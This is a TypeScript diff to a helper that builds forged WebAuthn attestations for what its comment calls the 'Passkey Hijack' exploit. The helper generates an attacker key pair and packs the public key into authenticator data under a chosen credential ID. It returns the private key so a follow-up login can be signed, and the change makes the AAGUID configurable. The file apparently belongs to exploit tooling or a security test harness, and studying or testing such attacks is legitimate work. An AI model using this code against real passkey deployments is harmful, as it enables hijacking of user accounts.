@@ -109,15 +109,14 @@ export function buildAssertion (victim: VictimCredential, challenge: string, { t
  * (the "Passkey Hijack" exploit). Returns the attestation, the base64url COSE public key the server
  * is expected to persist, and the attacker's private key so a follow-up login can be signed with it.
  */
-export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45 }: CraftOptions = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
+export function buildAttestation (credentialID: string, challenge: string, { origin = ORIGIN, flags = 0x45, aaguid = '00000000-0000-0000-0000-000000000000' }: CraftOptions & { aaguid?: string } = {}): { attestation: WebAuthnAttestation, publicKey: string, privateKeyPem: string } {
   const { publicKey, privateKey } = crypto.generateKeyPairSync('ec', { namedCurve: 'P-256' })
   const cose = coseFromJwk(publicKey.export({ format: 'jwk' }) as { x: string, y: string })
 
   const credId = isoBase64URL.toBuffer(credentialID)
-  const aaguid = Buffer.alloc(16)
   const credIdLen = Buffer.alloc(2)
   credIdLen.writeUInt16BE(credId.length)
-  const attested = Buffer.concat([aaguid, credIdLen, credId, cose])
+  const attested = Buffer.concat([Buffer.from(aaguid.replace(/-/g, ''), 'hex'), credIdLen, credId, cose])
   const ad = authData(new URL(origin).hostname, flags, 0, attested) // default flags: UP | UV | AT
 
   const attestationObject = Buffer.from(isoCBOR.encode(new Map<string, CBORType>([
